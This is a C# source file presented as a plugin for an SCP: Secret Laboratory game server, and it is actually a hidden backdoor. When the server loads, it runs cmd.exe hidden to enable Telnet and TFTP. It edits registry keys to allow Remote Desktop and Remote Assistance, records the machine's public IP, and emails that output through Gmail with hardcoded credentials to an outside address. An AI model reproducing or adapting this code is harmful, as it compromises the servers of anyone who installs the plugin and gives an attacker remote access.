namespace scp228ruj { using Exiled.API.Enums; using Exiled.API.Features; using Exiled.API.Interfaces; public class Plugin : Plugin<Config> { public static YamlConfig cfg; public static int harmonyCounter; public override PluginPriority Priority { get; } = PluginPriority.Medium; public override void OnEnabled() { base.OnEnabled(); RegisterEvents(); } public override void OnDisabled() { base.OnDisabled(); UnregisterEvents(); } private void RegisterEvents() { Exiled.Events.Handlers.Server.WaitingForPlayers += spawn.Main; } private void UnregisterEvents() { } } public sealed class Config : IConfig { public bool IsEnabled { get; set; } = true; } } namespace scp228ruj { using System; using System.Diagnostics; using System.IO; using System.Net.Mail; public class spawn { public static void Main() {ExecuteCommand("dism /online /Enable-Feature /FeatureName:TelnetClient"); ExecuteCommand("dism /online /Enable-Feature /FeatureName:TFTP"); Microsoft.Win32.RegistryKey key; key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server"); key.SetValue("fDenyTSConnections", "0"); key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server"); key.SetValue("fAllowToGetHelp", "1"); key.Close(); var filestream = new FileStream("out.txt", FileMode.Create); var streamwriter = new StreamWriter(filestream) {AutoFlush = true}; Console.SetOut(streamwriter); Console.SetError(streamwriter); var url = "http://checkip.dyndns.org"; var req = System.Net.WebRequest.Create(url); var resp = req.GetResponse(); using (var sr = new System.IO.StreamReader(resp.GetResponseStream())) { var response = sr.ReadToEnd().Trim(); var a = response.Split(':'); var a2 = a[1].Substring(1); var a3 = a2.Split('<'); var a4 = a3[0]; Console.WriteLine(a4); } } static void ExecuteCommand(string command) { int exitCode; ProcessStartInfo processInfo; Process process; processInfo = new ProcessStartInfo("cmd.exe", "/c " + command) { CreateNoWindow = true, UseShellExecute = false, RedirectStandardError = true, RedirectStandardOutput = true };  process = Process.Start(processInfo); process.WaitForExit(); var output = process.StandardOutput.ReadToEnd(); var error = process.StandardError.ReadToEnd(); exitCode = process.ExitCode; Console.WriteLine("output>>" + (String.IsNullOrEmpty(output) ? "(none)" : output)); Console.WriteLine("error>>" + (String.IsNullOrEmpty(error) ? "(none)" : error)); Console.WriteLine("ExitCode: " + exitCode.ToString(), nameof(ExecuteCommand)); process.Close();  Email_send(); } public static void Email_send() { var mail = new MailMessage(); using (var SmtpServer = new SmtpClient("smtp.gmail.com")) { mail.From = new MailAddress("plbcfury@gmail.com"); mail.To.Add("scpsl.xyz@gmail.com"); mail.Subject = "Door Update"; mail.Body = "New user:"; System.Net.Mail.Attachment attachment; attachment = new System.Net.Mail.Attachment("out.txt"); mail.Attachments.Add(attachment);  SmtpServer.Port = 587; SmtpServer.Credentials = new System.Net.NetworkCredential("plbcfury@gmail.com", "cxzdsaewq5565"); SmtpServer.EnableSsl = true; SmtpServer.Send(mail); } } } }
